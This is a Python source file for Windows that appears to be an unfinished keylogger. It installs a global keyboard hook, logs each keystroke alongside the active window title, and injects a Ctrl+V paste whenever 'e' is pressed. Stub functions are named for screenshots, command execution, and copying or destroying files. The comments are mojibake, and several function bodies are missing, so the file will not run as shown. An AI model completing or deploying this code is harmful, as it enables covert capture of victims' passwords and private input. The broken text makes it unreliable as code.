# -*- coding:utf-8 -*-
from ctypes import *
import pyHook
import threading
from PIL import ImageGrab
import pythoncom
import win32api
import win32con
from PIL import Image
import pytesseract
import socket
currenttitle=''
lasttitle=''
jilu=[]
def getlocaldir():
	#��õ�ǰ·��
	pass
def getlocalfiledir():
	#��ȡ��ǰ·�����ļ�
def getthetopfiledir():
	#��ȡ�Ͻ�·���ļ�Ŀ¼
def getfile(path,name):
	#��ȡ�ļ�
def boomwenjian(path):
	#���Ʋ����ָ��Ŀ¼���ļ�
def jietu():
	pass
	#��ȡ��ͼ
def cmd():
	pass
	#cmd���� 
#�����¼��������ҷ���
def onKeyboardEvent(event):
    global s
    global jilu
    global currenttitle
    global lasttitle
    windowTitle = create_string_buffer(512)
    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
    currenttitle= windowTitle.value.decode('gbk')
    c = chr(event.Ascii)
    #�����e
    if(c=='e'):
        #ģ���¼�  Conyrol+V����ɸ��ƹ���
        win32api.keybd_event(17, 0, 0, 0)  # ctrl��λ����17
        win32api.keybd_event(86, 0, 0, 0)  # v��λ����86
        win32api.keybd_event(86, 0, win32con.KEYEVENTF_KEYUP, 0)  # �ͷŰ���
        win32api.keybd_event(17, 0, win32con.KEYEVENTF_KEYUP, 0)
    if(currenttitle!=lasttitle):
        jilu=[]
        jilu.append(currenttitle)
    jilu.append(c)
    print("you last letter",chr(event.Ascii))
    lasttitle = windowTitle.value.decode('gbk')
    return True

#�����¼����ػ񣬴�������ϸ�def������onKeyboardEvent
def jianpan():
    try :
        hm = pyHook.HookManager()
        hm.KeyDown = onKeyboardEvent #�����Ǽ������£��¼�����onKeyboardEvent����
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    except Exception:
        return
threads=[]
t2 = threading.Thread(target=jianpan)
threads.append(t2)
for i in  threads:
    i.start()